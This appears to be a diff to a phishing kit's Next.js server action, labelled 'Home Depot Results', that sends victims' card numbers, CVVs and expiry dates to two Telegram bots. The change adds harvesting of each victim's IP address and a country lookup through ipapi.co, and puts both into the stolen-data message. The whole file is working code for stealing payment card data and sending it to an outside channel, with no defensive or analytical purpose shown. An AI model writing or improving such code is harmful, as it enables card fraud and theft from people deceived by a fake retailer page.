@@ -1,5 +1,7 @@
 "use server"
 
+import { headers } from "next/headers"
+
 export async function sendToTelegram(data: { cardNumber: string; cvv: string; expiryDate: string }) {
   try {
     // First Telegram bot
@@ -10,6 +12,22 @@ export async function sendToTelegram(data: { cardNumber: string; cvv: string; ex
     const botToken2 = process.env.TELEGRAM_BOT_TOKEN2
     const chatId2 = process.env.TELEGRAM_CHAT_ID2
 
+    // Get IP address and geolocation
+    const headersList = headers()
+    const forwardedFor = headersList.get("x-forwarded-for")
+    const ipAddress = forwardedFor ? forwardedFor.split(",")[0].trim() : headersList.get("x-real-ip") || "Unknown"
+
+    let country = "Unknown"
+    try {
+      const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`)
+      if (geoResponse.ok) {
+        const geoData = await geoResponse.json()
+        country = geoData.country_name || "Unknown"
+      }
+    } catch (geoError) {
+      console.error("Error fetching geolocation:", geoError)
+    }
+
     const message = `
 🔔 Home Depot Results:
 💳 Card Number: ${data.cardNumber}
@@ -17,6 +35,8 @@ export async function sendToTelegram(data: { cardNumber: string; cvv: string; ex
 📅 Expiry Date: ${data.expiryDate}
 📅 Submission Date: ${new Date().toLocaleString()}
 📱 Device: ${typeof window !== "undefined" ? window.navigator.userAgent : "Unknown"}
+🌍 IP Address: ${ipAddress}
+🗺️ Country: ${country}
     `
 
     // Send to first Telegram bot
